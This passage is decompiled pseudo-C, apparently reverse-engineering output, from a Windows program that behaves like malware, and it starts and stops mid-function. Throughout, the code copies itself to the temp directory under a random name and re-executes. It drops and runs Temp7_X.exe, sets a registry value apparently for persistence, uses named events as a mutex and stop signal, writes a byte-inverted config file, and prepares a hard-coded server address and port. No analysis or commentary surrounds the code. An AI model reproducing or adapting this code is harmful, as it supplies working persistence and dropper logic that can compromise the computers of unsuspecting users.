  int unaff_EDI;
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_20c;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_20c,0x104);
  pwVar2 = _wcsrchr(&local_20c,L'\\');
  *pwVar2 = L'\0';
  pwVar2 = pwVar2 + 1;
  pwVar3 = _wcsrchr(pwVar2,L'.');
  *pwVar3 = L'\0';
  iVar4 = unaff_EDI - (int)pwVar2;
  do {
    wVar1 = *pwVar2;
    *(wchar_t *)(iVar4 + (int)pwVar2) = wVar1;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  ___security_check_cookie_4(local_4 ^ (uint)&local_20c);
  return;
}



void FUN_004010a0(HINSTANCE param_1,undefined4 param_2,short *param_3)

{
  ushort uVar1;
  short sVar2;
  ushort *puVar3;
  DWORD DVar4;
  ushort *puVar5;
  int iVar6;
  bool bVar7;
  wchar_t wStack_218;
  undefined auStack_216 [522];
  uint local_c;
  
  local_c = DAT_00422044 ^ (uint)&wStack_218;
  LoadStringW(param_1,0x67,(LPWSTR)&DAT_004246b0,100);
  LoadStringW(param_1,0x6d,(LPWSTR)&DAT_004245e8,100);
  FUN_00401290();
  iVar6 = (int)&DAT_004251b8 - (int)param_3;
  do {
    sVar2 = *param_3;
    *(short *)(iVar6 + (int)param_3) = sVar2;
    param_3 = param_3 + 1;
  } while (sVar2 != 0);
  DAT_004230b0 = FUN_00403820();
  puVar5 = &DAT_0041dc20;
  puVar3 = &DAT_004251b8;
  do {
    uVar1 = *puVar3;
    bVar7 = uVar1 < *puVar5;
    if (uVar1 != *puVar5) {
LAB_00401139:
      iVar6 = (1 - (uint)bVar7) - (uint)(bVar7 != 0);
      goto LAB_0040113e;
    }
    if (uVar1 == 0) break;
    uVar1 = puVar3[1];
    bVar7 = uVar1 < puVar5[1];
    if (uVar1 != puVar5[1]) goto LAB_00401139;
    puVar3 = puVar3 + 2;
    puVar5 = puVar5 + 2;
  } while (uVar1 != 0);
  iVar6 = 0;
LAB_0040113e:
  if (iVar6 != 0) {
    iVar6 = FUN_00401b20();
    if (iVar6 != 0) {
      FUN_00403be0();
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
  }
  iVar6 = FUN_00401320(param_1);
  if (iVar6 == 0) {
    ___security_check_cookie_4(local_c ^ (uint)&wStack_218);
    return;
  }
  LoadAcceleratorsW(param_1,(LPCWSTR)0x6d);
  wStack_218 = L'\0';
  _memset(auStack_216,0,0x206);
  if ((DAT_00424e00 != 0) && (DAT_00424e04 != 0)) {
    FUN_004037a0(DAT_00424e00);
    DAT_0042365c = DAT_00424e04;
  }
  GetTickCount();
  FUN_00402fc0(1000,(wchar_t *)&DAT_004253c8,u_Temp7_X_exe_0041dc28);
  Sleep(1000);
  FUN_00402c90();
  FUN_00402fe0();
  _wcscat_s(&wStack_218,0x104,(wchar_t *)&DAT_0041dc40);
  _wcscat_s(&wStack_218,0x104,(wchar_t *)&DAT_004253c8);
  DVar4 = GetFileAttributesW(&wStack_218);
  if (DVar4 != 0xffffffff) {
    Sleep(500);
    ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&wStack_218,&DAT_0041ddcc,(LPCWSTR)0x0,1);
  }
  FUN_004029b0();
  FUN_00403be0();
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void FUN_00401290(void)

{
  HINSTANCE in_EAX;
  WNDCLASSEXW local_34;
  
  local_34.cbSize = 0x30;
  local_34.style = 3;
  local_34.lpfnWndProc = FUN_004016b0;
  local_34.cbClsExtra = 0;
  local_34.cbWndExtra = 0;
  local_34.hInstance = in_EAX;
  local_34.hIcon = LoadIconW(in_EAX,(LPCWSTR)0x6b);
  local_34.hCursor = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  local_34.hbrBackground = (HBRUSH)0x6;
  local_34.lpszMenuName = (LPCWSTR)0x6d;
  local_34.lpszClassName = (LPCWSTR)&DAT_004245e8;
  local_34.hIconSm = LoadIconW(local_34.hInstance,(LPCWSTR)0x6c);
  RegisterClassExW(&local_34);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00401320(HINSTANCE param_1)

{
  ushort uVar1;
  short sVar2;
  undefined2 uVar3;
  undefined4 *puVar4;
  HWND pHVar5;
  ushort *puVar6;
  int iVar7;
  DWORD DVar8;
  undefined4 *puVar9;
  HANDLE pvVar10;
  ushort *puVar11;
  bool bVar12;
  undefined auStack_7f0 [404];
  short sStack_65c;
  undefined auStack_65a [58];
  WCHAR WStack_620;
  undefined auStack_61e [518];
  short sStack_418;
  undefined auStack_416 [518];
  WCHAR WStack_210;
  undefined auStack_20e [522];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)auStack_7f0;
  DAT_00424778 = param_1;
  pHVar5 = CreateWindowExW(0,(LPCWSTR)&DAT_004245e8,(LPCWSTR)&DAT_004246b0,0xcf0000,-0x80000000,0,
                           -0x80000000,0,(HWND)0x0,(HMENU)0x0,param_1,(LPVOID)0x0);
  if (pHVar5 != (HWND)0x0) {
    WStack_210 = L'\0';
    _memset(auStack_20e,0,0x206);
    WStack_620 = L'\0';
    _memset(auStack_61e,0,0x206);
    sStack_418 = 0;
    _memset(auStack_416,0,0x206);
    GetModuleFileNameW((HMODULE)0x0,&WStack_210,0x104);
    puVar11 = &DAT_0041dc20;
    puVar6 = &DAT_004251b8;
    do {
      uVar1 = *puVar6;
      bVar12 = uVar1 < *puVar11;
      if (uVar1 != *puVar11) {
LAB_00401416:
        iVar7 = (1 - (uint)bVar12) - (uint)(bVar12 != 0);
        goto LAB_0040141b;
      }
      if (uVar1 == 0) break;
      uVar1 = puVar6[1];
      bVar12 = uVar1 < puVar11[1];
      if (uVar1 != puVar11[1]) goto LAB_00401416;
      puVar6 = puVar6 + 2;
      puVar11 = puVar11 + 2;
    } while (uVar1 != 0);
    iVar7 = 0;
LAB_0040141b:
    if (iVar7 != 0) {
      _memset(&WStack_620,0,0x208);
      GetTempPathW(0x104,&WStack_620);
      _memset(&sStack_418,0,0x208);
      DVar8 = GetTickCount();
      FUN_0040ad1b(DVar8);
      FUN_00403080(6,(int)&sStack_418);
      wsprintfW(&WStack_620,u__s_s_exe_0041dc44,&WStack_620,&sStack_418);
      CopyFileW(&WStack_210,&WStack_620,0);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&WStack_620,&DAT_0041dc20,(LPCWSTR)0x0,1);
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
    Ordinal_115(0x101,auStack_7f0);
    iVar7 = FUN_0040aaa0(1);
    if (iVar7 == 0) {
      sStack_65c = 0;
      _memset(auStack_65a,0,0x3a);
      FUN_00401000();
      iVar7 = 0;
      do {
        sVar2 = *(short *)(auStack_65a + iVar7 + -2);
        *(short *)((int)&DAT_004250e0 + iVar7) = sVar2;
        iVar7 = iVar7 + 2;
      } while (sVar2 != 0);
      _wcscpy_s((wchar_t *)&DAT_00424f3c,0x40,&DAT_0041dc58);
      DAT_00424fbc = 0x51;
      _wcscpy_s(&DAT_00424fbe,0x10,&DAT_0041dc74);
      _wcscpy_s((wchar_t *)&DAT_00424fde,0x40,&DAT_0041dc80);
      DAT_0042505e = 0x2b66;
      iVar7 = 0;
      do {
        sVar2 = *(short *)(auStack_65a + iVar7 + -2);
        *(short *)((int)&DAT_004250c0 + iVar7) = sVar2;
        uVar3 = DAT_0041dca0;
        iVar7 = iVar7 + 2;
      } while (sVar2 != 0);
      puVar4 = (undefined4 *)0x4250be;
      do {
        puVar9 = puVar4;
        puVar4 = (undefined4 *)((int)puVar9 + 2);
      } while (*(short *)((int)puVar9 + 2) != 0);
      *(undefined4 *)((int)puVar9 + 2) = DAT_0041dc9c;
      *(undefined2 *)((int)puVar9 + 6) = uVar3;
      DAT_00425100 = 5;
    }
    FUN_004018d0();
    FUN_00401000();
    iVar7 = 0;
    do {
      sVar2 = *(short *)(auStack_416 + iVar7 + -2);
      *(short *)((int)&DAT_00425138 + iVar7) = sVar2;
      iVar7 = iVar7 + 2;
    } while (sVar2 != 0);
    pvVar10 = OpenEventW(0x20000,0,&DAT_00425138);
    if (pvVar10 == (HANDLE)0x0) {
      pvVar10 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&DAT_00425138);
      if (pvVar10 != (HANDLE)0x0) {
        FUN_00402820(&DAT_004255d0);
        _DAT_004255d8 = DAT_00425104;
        _DAT_00423648 =
             CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00401810,
                          (LPVOID)0x0,0,(LPDWORD)0x0);
        ___security_check_cookie_4(local_4 ^ (uint)auStack_7f0);
        return;
      }
    }
    else {
      CloseHandle(pvVar10);
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_7f0);
  return;
}



void FUN_004016b0(HWND param_1,UINT param_2,uint param_3,LPARAM param_4)

{
  undefined auStack_54 [4];
  tagPAINTSTRUCT local_50;
  uint local_c;
  
  local_c = DAT_00422044 ^ (uint)auStack_54;
  if (param_2 == 2) {
    PostQuitMessage(0);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  if (param_2 == 0xf) {
    BeginPaint(param_1,&local_50);
    EndPaint(param_1,&local_50);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  if (param_2 != 0x111) {
    DefWindowProcW(param_1,param_2,param_3,param_4);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  if ((param_3 & 0xffff) != 0x68) {
    if ((param_3 & 0xffff) != 0x69) {
      DefWindowProcW(param_1,0x111,param_3,param_4);
      ___security_check_cookie_4(local_c ^ (uint)auStack_54);
      return;
    }
    DestroyWindow(param_1);
    ___security_check_cookie_4(local_c ^ (uint)auStack_54);
    return;
  }
  DialogBoxParamW(DAT_00424778,(LPCWSTR)0x67,param_1,(DLGPROC)&LAB_004017d0,0);
  ___security_check_cookie_4(local_c ^ (uint)auStack_54);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004018d0(void)

{
  short *psVar1;
  int iVar2;
  
  _DAT_00424d08 = DAT_00425100;
  DAT_00424e00 = FUN_00403620(&DAT_00424fde);
  DAT_00424e04 = DAT_0042505e;
  DAT_00424e06 = FUN_00403620(&DAT_00424f3c);
  DAT_00424e0a = (uint)DAT_00424fbc;
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00424fbe + iVar2);
    *(short *)((int)&DAT_00424e0e + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_004250e0 + iVar2);
    *(short *)((int)&DAT_00424e2e + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_004250c0 + iVar2);
    *(short *)((int)&DAT_00424e4e + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  return;
}



void FUN_00401980(void)

{
  wchar_t *unaff_ESI;
  wchar_t local_234;
  undefined4 local_232;
  undefined4 local_22e;
  undefined4 local_22a;
  undefined4 local_226;
  undefined4 local_222;
  undefined4 local_21e;
  undefined4 local_21a;
  undefined4 local_216;
  undefined4 local_212;
  undefined2 local_20e;
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_234;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  local_234 = L'\0';
  local_232 = 0;
  local_22e = 0;
  local_22a = 0;
  local_226 = 0;
  local_222 = 0;
  local_21e = 0;
  local_21a = 0;
  local_216 = 0;
  local_212 = 0;
  local_20e = 0;
  _wcscpy_s(&local_234,0x14,unaff_ESI);
  _wcscat_s(&local_234,0x14,u__exe_0041dcb0);
  GetModuleFileNameW((HMODULE)0x0,&local_20c,0x104);
  _wcsstr(&local_20c,&local_234);
  ___security_check_cookie_4(local_4 ^ (uint)&local_234);
  return;
}



undefined4 __cdecl FUN_00401a50(wchar_t *param_1,int param_2)

{
  wchar_t *in_EAX;
  errno_t eVar1;
  size_t _ElementSize;
  void *_DstBuf;
  FILE *local_4;
  
  local_4 = (FILE *)0x0;
  eVar1 = __wfopen_s(&local_4,in_EAX,(wchar_t *)&DAT_0041dcbc);
  if (eVar1 != 0) {
    return 0;
  }
  _fseek(local_4,0,2);
  _ElementSize = _ftell(local_4);
  _fseek(local_4,0,0);
  _DstBuf = _malloc(_ElementSize + param_2);
  _fread(_DstBuf,_ElementSize,1,local_4);
  _fclose(local_4);
  FUN_00403b50();
  eVar1 = __wfopen_s(&local_4,param_1,(wchar_t *)&DAT_0041dcc4);
  if (eVar1 != 0) {
    return 0;
  }
  _fwrite(_DstBuf,_ElementSize + param_2,1,local_4);
  _fclose(local_4);
  return 1;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void FUN_00401b20(void)

{
  short *psVar1;
  WCHAR WVar2;
  wchar_t wVar3;
  short sVar4;
  int iVar5;
  undefined4 *puVar6;
  int iVar7;
  undefined4 *puVar8;
  HANDLE pvVar9;
  WCHAR *pWVar10;
  DWORD DVar11;
  int iVar12;
  LSTATUS LVar13;
  wchar_t *pwVar14;
  int iVar15;
  ulonglong uVar16;
  wchar_t *_Dst;
  uint local_1c4c;
  uint local_1c48;
  int local_1c44;
  HKEY pHStack_1c40;
  int local_1c3c;
  int local_1c38;
  int local_1c34;
  wchar_t awStack_1c30 [64];
  ushort uStack_1bb0;
  wchar_t awStack_1bae [16];
  wchar_t awStack_1b8e [64];
  ushort uStack_1b0e;
  wchar_t awStack_1b0c [16];
  wchar_t awStack_1aec [16];
  wchar_t awStack_1acc [16];
  wchar_t awStack_1aac [16];
  wchar_t awStack_1a8c [16];
  int iStack_1a6c;
  undefined4 uStack_1a68;
  wchar_t awStack_1a34 [4];
  int iStack_1a2c;
  uint uStack_1934;
  ushort uStack_1930;
  uint uStack_192e;
  ushort uStack_192a;
  short asStack_1926 [16];
  wchar_t awStack_1906 [135];
  short asStack_17f8 [64];
  ushort uStack_1778;
  short asStack_1776 [80];
  ushort uStack_16d6;
  wchar_t local_15fc;
  undefined4 local_15fa;
  undefined4 local_15f6;
  undefined4 local_15f2;
  undefined4 local_15ee;
  undefined4 local_15ea;
  undefined4 local_15e6;
  undefined4 local_15e2;
  undefined2 local_15de;
  wchar_t local_15dc;
  undefined4 local_15da;
  undefined4 local_15d6;
  undefined4 local_15d2;
  undefined4 local_15ce;
  undefined4 local_15ca;
  undefined4 local_15c6;
  undefined4 local_15c2;
  undefined2 local_15be;
  wchar_t local_15bc;
  undefined local_15ba [126];
  wchar_t local_153c;
  undefined local_153a [126];
  wchar_t local_14bc;
  undefined local_14ba [126];
  WCHAR local_143c;
  undefined local_143a [518];
  WCHAR WStack_1234;
  undefined auStack_1232 [518];
  WCHAR local_102c;
  undefined local_102a [516];
  undefined4 uStack_e26;
  undefined auStack_e22 [518];
  wchar_t local_c1c;
  undefined local_c1a [518];
  WCHAR local_a14;
  undefined local_a12 [518];
  wchar_t wStack_80c;
  undefined auStack_80a [2050];
  uint local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x401b2a;
  local_8 = DAT_00422044 ^ (uint)&local_1c4c;
  local_143c = L'\0';
  _memset(local_143a,0,0x206);
  local_a14 = L'\0';
  _memset(local_a12,0,0x206);
  local_c1c = L'\0';
  _memset(local_c1a,0,0x206);
  local_15fa = 0;
  local_15f6 = 0;
  local_15f2 = 0;
  local_15ee = 0;
  local_15ea = 0;
  local_15e6 = 0;
  local_15e2 = 0;
  local_15de = 0;
  local_15fc = L'\0';
  local_14bc = L'\0';
  _memset(local_14ba,0,0x7e);
  local_153c = L'\0';
  _memset(local_153a,0,0x7e);
  local_1c48 = 0;
  local_15bc = L'\0';
  _memset(local_15ba,0,0x7e);
  local_1c4c = 0;
  local_102c = L'\0';
  _memset(local_102a,0,0x206);
  local_15dc = L'\0';
  local_15da = 0;
  local_15d6 = 0;
  local_15d2 = 0;
  local_15ce = 0;
  local_15ca = 0;
  local_15c6 = 0;
  local_15c2 = 0;
  local_15be = 0;
  iVar15 = 0;
  local_1c3c = 0;
  _memset(&local_1c34,0,0x200);
  iVar7 = FUN_0040aaa0(1);
  local_1c44 = iVar7;
  local_1c38 = FUN_0040aaa0(0);
  GetModuleFileNameW((HMODULE)0x0,&local_a14,0x104);
  if (iVar7 == 0) {
    if (DAT_004230b0 == 3) {
      _memset(awStack_1a34,0,0x236);
      local_1c3c = FUN_00404340();
      if (local_1c3c != 0) {
        iVar15 = 0;
        do {
          sVar4 = *(short *)((int)asStack_1926 + iVar15);
          *(short *)(local_14ba + iVar15 + -2) = sVar4;
          iVar15 = iVar15 + 2;
        } while (sVar4 != 0);
        FUN_00403720(uStack_192e);
        local_1c48 = (uint)uStack_192a;
        FUN_00403720(uStack_1934);
        pwVar14 = awStack_1906;
        _Dst = &local_15fc;
        iVar15 = iStack_1a2c;
        uStack_1b0e = uStack_1930;
        goto LAB_0040206f;
      }
    }
  }
  else {
    _wcscpy_s(&local_15fc,0x10,awStack_1a8c);
    FUN_00403ab0();
    iVar15 = FUN_00401980();
    if (iVar15 == 1) goto LAB_004025ac;
    WStack_1234 = L'\0';
    _memset(auStack_1232,0,0x206);
    uStack_e26._2_2_ = 0;
    _memset(auStack_e22,0,0x206);
    iVar15 = 0;
    do {
      sVar4 = *(short *)((int)awStack_1a8c + iVar15);
      *(short *)(auStack_1232 + iVar15 + -2) = sVar4;
      iVar15 = iVar15 + 2;
    } while (sVar4 != 0);
    iVar15 = 0;
    do {
      sVar4 = *(short *)((int)awStack_1a8c + iVar15);
      *(short *)(auStack_e22 + iVar15 + -2) = sVar4;
      iVar15 = iVar15 + 2;
    } while (sVar4 != 0);
    puVar6 = &uStack_e26;
    do {
      puVar8 = puVar6;
      puVar6 = (undefined4 *)((int)puVar8 + 2);
    } while (*(short *)((int)puVar8 + 2) != 0);
    *(undefined4 *)((int)puVar8 + 2) = u__STOP_0041dca4._0_4_;
    *(undefined4 *)((int)puVar8 + 6) = u__STOP_0041dca4._4_4_;
    *(undefined4 *)((int)puVar8 + 10) = u__STOP_0041dca4._8_4_;
    pvVar9 = OpenEventW(0x20000,0,&WStack_1234);
    if (pvVar9 != (HANDLE)0x0) {
      CloseHandle(pvVar9);
      CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)((int)&uStack_e26 + 2));
      pvVar9 = OpenEventW(0x20000,0,&WStack_1234);
      for (iVar15 = 0; (pvVar9 != (HANDLE)0x0 && (iVar15 < 5)); iVar15 = iVar15 + 1) {
        CloseHandle(pvVar9);
        Sleep(200);
        pvVar9 = OpenEventW(0x20000,0,&WStack_1234);
      }
    }
    Sleep(0x5dc);
    DeleteFileW(&local_143c);
    GetTempPathW(0x104,&local_143c);
    _wcscat_s(&local_143c,0x104,awStack_1aac);
    _wcscat_s(&local_143c,0x104,u__exe_0041dcb0);
    pWVar10 = &local_143c;
    do {
      WVar2 = *pWVar10;
      pWVar10 = pWVar10 + 1;
    } while (WVar2 != L'\0');
    if (((int)pWVar10 - (int)local_143a >> 1 != 0) &&
       (DVar11 = GetFileAttributesW(&local_143c), DVar11 != 0xffffffff)) {
      iVar15 = 0;
      do {
        psVar1 = (short *)((int)awStack_1aac + iVar15);
        *(short *)((int)awStack_1a34 + iVar15) = *psVar1;
        iVar15 = iVar15 + 2;
      } while (*psVar1 != 0);
      _wcscat_s(awStack_1a34,0x104,u__exe_0041dcb0);
      DeleteFileW(&local_143c);
    }
    iVar15 = 0;
    do {
      sVar4 = *(short *)((int)awStack_1bae + iVar15);
      *(short *)(local_14ba + iVar15 + -2) = sVar4;
      iVar15 = iVar15 + 2;
    } while (sVar4 != 0);
    iVar15 = 0;
    do {
      sVar4 = *(short *)((int)awStack_1c30 + iVar15);
      *(short *)(local_153a + iVar15 + -2) = sVar4;
      iVar15 = iVar15 + 2;
    } while (sVar4 != 0);
    local_1c48 = (uint)uStack_1bb0;
    iVar15 = 0;
    do {
      sVar4 = *(short *)((int)awStack_1b8e + iVar15);
      *(short *)(local_15ba + iVar15 + -2) = sVar4;
      iVar15 = iVar15 + 2;
    } while (sVar4 != 0);
    pwVar14 = awStack_1aac;
    _Dst = &local_15dc;
    iVar15 = iStack_1a6c;
LAB_0040206f:
    local_1c4c = (uint)uStack_1b0e;
    _wcscpy_s(_Dst,0x10,pwVar14);
  }
  iVar7 = local_1c38;
  if (local_1c38 != 0) {
    iVar15 = 0;
    do {
      sVar4 = *(short *)((int)asStack_1776 + iVar15);
      *(short *)(local_14ba + iVar15 + -2) = sVar4;
      iVar15 = iVar15 + 2;
    } while (sVar4 != 0);
    iVar15 = 0;
    do {
      sVar4 = *(short *)((int)asStack_17f8 + iVar15);
      *(short *)(local_153a + iVar15 + -2) = sVar4;
      iVar15 = iVar15 + 2;
    } while (sVar4 != 0);
    local_1c48 = (uint)uStack_1778;
    iVar15 = 0;
    do {
      sVar4 = *(short *)((int)&DAT_0041dc80 + iVar15);
      *(short *)(local_15ba + iVar15 + -2) = sVar4;
      iVar15 = iVar15 + 2;
    } while (sVar4 != 0);
    local_1c4c = (uint)uStack_16d6;
    iVar15 = 5;
    if (DAT_004230b0 == 3) {
      GetSystemDirectoryW(&local_102c,0x104);
      _wcscat_s(&local_102c,0x104,(wchar_t *)&DAT_0041dc40);
    }
    else {
      GetTempPathW(0x104,&local_102c);
    }
    iVar12 = 0;
    do {
      iVar5 = iVar12 + -2;
      *(short *)(local_c1a + iVar12 + -2) = *(short *)(local_102a + iVar5);
      iVar12 = iVar12 + 2;
    } while (*(short *)(local_102a + iVar5) != 0);
    _wcscat_s(&local_c1c,0x104,u_golfset_ini_0041dccc);
    DeleteFileW(&local_c1c);
  }
  _memset(&local_1c34,0,0x200);
  local_1c34 = 0x504d534d;
  uStack_1bb0 = 0x51;
  iVar12 = 0;
  do {
    sVar4 = *(short *)((int)&DAT_0041dc58 + iVar12);
    *(short *)((int)awStack_1c30 + iVar12) = sVar4;
    iVar12 = iVar12 + 2;
  } while (sVar4 != 0);
  uStack_1b0e = 0x2b66;
  iVar12 = 0;
  do {
    sVar4 = *(short *)((int)&DAT_0041dc80 + iVar12);
    *(short *)((int)awStack_1b8e + iVar12) = sVar4;
    iVar12 = iVar12 + 2;
  } while (sVar4 != 0);
  iVar12 = 0;
  do {
    sVar4 = *(short *)((int)&DAT_0041dc74 + iVar12);
    *(short *)((int)awStack_1bae + iVar12) = sVar4;
    iVar12 = iVar12 + 2;
  } while (sVar4 != 0);
  iStack_1a6c = 5;
  if (((local_1c44 != 0) || (local_1c3c != 0)) || (iVar7 != 0)) {
    _wcscpy_s(awStack_1bae,0x10,&local_14bc);
    _wcscpy_s(awStack_1c30,0x40,&local_153c);
    uStack_1bb0 = (ushort)local_1c48;
    _wcscpy_s(awStack_1b8e,0x40,&local_15bc);
    uStack_1b0e = (ushort)local_1c4c;
    iStack_1a6c = iVar15;
    if (iVar15 == 0) {
      iStack_1a6c = 5;
    }
  }
  iVar15 = 0;
  do {
    sVar4 = *(short *)((int)&DAT_0041dc80 + iVar15);
    *(short *)((int)awStack_1b8e + iVar15) = sVar4;
    iVar15 = iVar15 + 2;
  } while (sVar4 != 0);
  if ((awStack_1c30[0] != L'\0') && (uStack_1bb0 != 0)) {
    local_1c34 = 0x504d534d;
    DVar11 = GetTickCount();
    FUN_0040ad1b(DVar11);
    wStack_80c = L'\0';
    _memset(auStack_80a,0,0x7fe);
    if (awStack_1b0c[0] == L'\0') {
      FUN_00403080(5,(int)&wStack_80c);
      _wcscpy_s(awStack_1b0c,0x10,&wStack_80c);
    }
    if (awStack_1aec[0] == L'\0') {
      FUN_00403080(5,(int)&wStack_80c);
      _wcscpy_s(awStack_1aec,0x10,&wStack_80c);
    }
    if (awStack_1aac[0] == L'\0') {
      FUN_00403080(5,(int)&wStack_80c);
      _wcscpy_s(awStack_1aac,0x10,&wStack_80c);
    }
    if (awStack_1a8c[0] == L'\0') {
      FUN_00403080(5,(int)&wStack_80c);
      _wcscpy_s(awStack_1a8c,0x10,&wStack_80c);
      pwVar14 = &local_15fc;
      do {
        wVar3 = *pwVar14;
        pwVar14 = pwVar14 + 1;
      } while (wVar3 != L'\0');
      if ((int)pwVar14 - (int)&local_15fa >> 1 != 0) {
        _wcscpy_s(awStack_1a8c,0x10,&local_15fc);
      }
    }
    pwVar14 = &local_15dc;
    do {
      wVar3 = *pwVar14;
      pwVar14 = pwVar14 + 1;
    } while (wVar3 != L'\0');
    if ((int)pwVar14 - (int)&local_15da >> 1 != 0) {
      _wcscpy_s(awStack_1acc,0x10,&local_15dc);
    }
    if (awStack_1acc[0] == L'\0') {
      FUN_00403080(5,(int)&wStack_80c);
      _wcscpy_s(awStack_1acc,0x10,&wStack_80c);
    }
    uStack_1a68 = 0x10001af;
    if (iStack_1a6c == 0) {
      iStack_1a6c = 5;
    }
    iVar15 = FUN_0040ab60(&local_1c34);
    if (iVar15 != 0) {
      pwVar14 = &local_143c;
      FUN_00403ab0();
      DVar11 = GetTickCount();
      FUN_0040ad1b(DVar11);
      uVar16 = FUN_00403040(0x32);
      FUN_00401a50(pwVar14,(int)uVar16);
      pHStack_1c40 = (HKEY)0x0;
      LVar13 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041dce8,0,3,
                             &pHStack_1c40);
      if (LVar13 == 0) {
        do {
          wVar3 = *pwVar14;
          pwVar14 = pwVar14 + 1;
        } while (wVar3 != L'\0');
        LVar13 = RegSetValueExW(pHStack_1c40,(LPCWSTR)&DAT_0041dd54,0,1,(BYTE *)&local_143c,
                                ((int)pwVar14 - (int)local_143a >> 1) * 2 + 2);
        if (LVar13 == 0) {
          RegCloseKey(pHStack_1c40);
        }
      }
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_143c,&DAT_0041ddcc,(LPCWSTR)0x0,1);
    }
  }
LAB_004025ac:
  ___security_check_cookie_4(local_8 ^ (uint)&local_1c4c);
  return;
}



void __fastcall FUN_004025d0(wchar_t *param_1,wchar_t *param_2,uint param_3,undefined4 param_4)

{
  uint uVar1;
  FILE *_File;
  undefined auStack_98 [4];
  wchar_t local_94 [50];
  undefined4 local_30;
  wchar_t local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)auStack_98;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_28 = L'\0';
  _memset(local_94,0,0x68);
  _wcscpy_s(local_94,0x20,param_2);
  local_30 = param_4;
  FUN_00403720(param_3);
  _wcscpy_s(local_94 + 0x21,0x10,&local_28);
  uVar1 = 0;
  do {
    *(byte *)((int)local_94 + uVar1) = ~*(byte *)((int)local_94 + uVar1);
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x68);
  _File = __wfopen(param_1,(wchar_t *)&DAT_0041dcc4);
  if (_File != (FILE *)0x0) {
    _fwrite(local_94,1,0x68,_File);
    _fclose(_File);
    ___security_check_cookie_4(local_8 ^ (uint)auStack_98);
    return;
  }
  ___security_check_cookie_4(local_8 ^ (uint)auStack_98);
  return;
}



undefined8 __cdecl FUN_00402700(LPCWSTR param_1,undefined4 param_2)

{
  void *pvVar1;
  int in_EAX;
  DWORD DVar2;
  void *lpBuffer;
  int iVar3;
  HANDLE hFile;
  BOOL BVar4;
  uint uVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint extraout_EDX_01;
  undefined8 uVar6;
  ulonglong uVar7;
  void *pvStack_8;
  uint uStack_4;
  
  DVar2 = GetFileAttributesW(param_1);
  if (DVar2 != 0xffffffff) {
    uVar6 = FUN_00403920();
    if ((int)uVar6 == in_EAX) {
      return CONCAT44((int)((ulonglong)uVar6 >> 0x20),1);
    }
  }
  lpBuffer = _malloc(0x200000);
  pvStack_8 = (void *)0x200000;
  iVar3 = FUN_00405f50(in_EAX,&pvStack_8,param_2,lpBuffer);
  if (iVar3 != 0) {
    DVar2 = GetTickCount();
    FUN_0040ad1b(DVar2);
    uStack_4 = _rand();
    uVar7 = FUN_00417860(extraout_ECX,extraout_EDX);
    pvVar1 = pvStack_8;
    FUN_00403b50();
    DVar2 = (int)uVar7 + (int)pvVar1;
    hFile = FUN_0040abf0();
    if (hFile != (HANDLE)0xffffffff) {
      BVar4 = WriteFile(hFile,lpBuffer,DVar2,&uStack_4,(LPOVERLAPPED)0x0);
      uVar5 = -(uint)(BVar4 != 0) & uStack_4;
      CloseHandle(hFile);
      if (uVar5 == DVar2) {
        _free(lpBuffer);
        return CONCAT44(extraout_EDX_00,1);
      }
    }
  }
  _free(lpBuffer);
  return (ulonglong)extraout_EDX_01 << 0x20;
}



void __fastcall FUN_00402820(undefined4 *param_1)

{
  short sVar1;
  wchar_t wVar2;
  int iVar3;
  wchar_t *pwVar4;
  short *psVar5;
  undefined auStack_d0 [4];
  undefined local_cc [74];
  undefined4 local_82;
  undefined2 local_7e;
  undefined4 local_7c;
  short local_74 [38];
  undefined2 local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
